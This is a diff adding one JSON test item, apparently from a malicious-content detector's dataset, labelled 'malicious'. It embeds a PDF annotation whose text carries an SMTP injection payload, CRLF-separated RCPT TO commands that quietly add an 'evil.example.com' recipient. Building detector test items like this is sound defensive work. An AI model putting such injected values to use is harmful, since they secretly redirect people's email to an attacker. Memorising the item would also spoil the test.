@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::53::binary-variations::6",
+  "base_sample_id": "exp::email-webfetch::53",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1597350734,
+  "content": "{\n  \"format\": \"pdf\",\n  \"annotations\": [\n    {\n      \"type\": \"StrikeOut\",\n      \"contents\": \"RCPT TO: <victim@target.example.com>\\r\\nRCPT TO: <spy@evil.example.com>\\n\",\n      \"page\": 1,\n      \"rect\": [\n        100,\n        700,\n        400,\n        720\n      ]\n    }\n  ]\n}",
+  "content_hash": "e1b2e3c6cbb63fbcbe6feb780b88171ef8642935c8b2ba88fe2f05cea6953264",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-annotation",
+  "difficulty": "advanced"
+}
